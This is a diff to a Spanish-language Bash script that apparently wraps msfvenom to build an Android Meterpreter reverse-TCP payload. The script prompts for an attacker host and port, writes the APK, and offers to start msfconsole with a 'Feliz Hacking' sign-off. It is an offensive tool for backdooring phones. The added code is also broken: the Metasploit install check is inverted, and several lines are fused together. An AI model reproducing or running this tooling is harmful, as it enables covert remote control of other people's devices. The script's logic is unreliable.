@@ -25,7 +25,6 @@ fi
 
 
 
-
 # creando payload para andorid
 echo -e ${blanco}"+                                                     +"
 sleep 0.8
@@ -60,6 +59,21 @@ read -p ">>> " opcion
 
 case $opcion in
 	1)  
+
+
+            sleep 2
+                if [ ! -x ${bin}/msfvenom ]; then
+                        echo -e ${verde}"
+                Empezando...."${blanco}
+                         sleep 2
+                 else
+                         echo -e ${rojo}"
+           Lo sentimos no tiene instalado Metasploit :(
+                         "${blanco}
+                         exit 1
+                fi
+                sleep 1.5
+
 	    echo ""
             read -p "Digite tu LHOST: " LHOST
             sleep 1
@@ -81,11 +95,23 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT"  R > /
 	    echo -e ${verde}"[✓]Guardado en la memoria interna"
 	    sleep 1.5
 	    echo ""
-            echo -e ${verde}" Ahora ejecutare metasploit en 7 segundos"
-            sleep 2
-	    echo ""
-            msfconsole
-	    echo ""
+echo -e ${blanco}" ¿Ejecuto Metasploit?"
+echo -e ${verde}"
+[1]${blanco} Si"
+echo ""
+echo -e ${verde}"[2]${blanco} No"
+echo ""
+echo -e -n ${cyan}">>>${verde} "
+read -r opcion
+
+if [ "${opcion}" == "1" ]; then
+        msfconsole
+        echo -e ${verde}"Feliz Hacking ^_^"
+        sleep 2.5
+        exit
+else
+        echo ""                                                               echo "Hasta luego ^_^"
+        sleep 3                                                       fi
 	    echo -e ${verde}"Hasta pronto ^_^"
 	    sleep 1
 ;;
